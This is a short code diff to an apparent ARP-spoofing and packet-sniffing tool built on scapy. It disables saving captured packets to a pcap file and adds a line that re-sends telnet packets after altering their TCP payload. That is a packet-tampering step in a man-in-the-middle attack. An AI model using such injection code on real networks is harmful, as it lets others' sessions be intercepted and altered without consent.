@@ -108,7 +108,7 @@ class Arper:
             if len(all[i]) != 0:
                 writePcap(all_names[i], all[i])
 
-        writePcap("all.pcap", captured_packets)
+        #writePcap("all.pcap", captured_packets)
 
     def sniff(self, count=100):
         # this function performs the sniffing attack
@@ -173,6 +173,7 @@ class filter:
                 print("telnet captured")
                 telnet_pkts.append(pkt)
                 modified_pkt = self.modifyTCPDFData(pkt=pkt, repalceWith="R")
+                scapy.send(modified_pkt)
                 if modified_pkt is not None:
                     modified_telnet.append(modified_pkt)
 
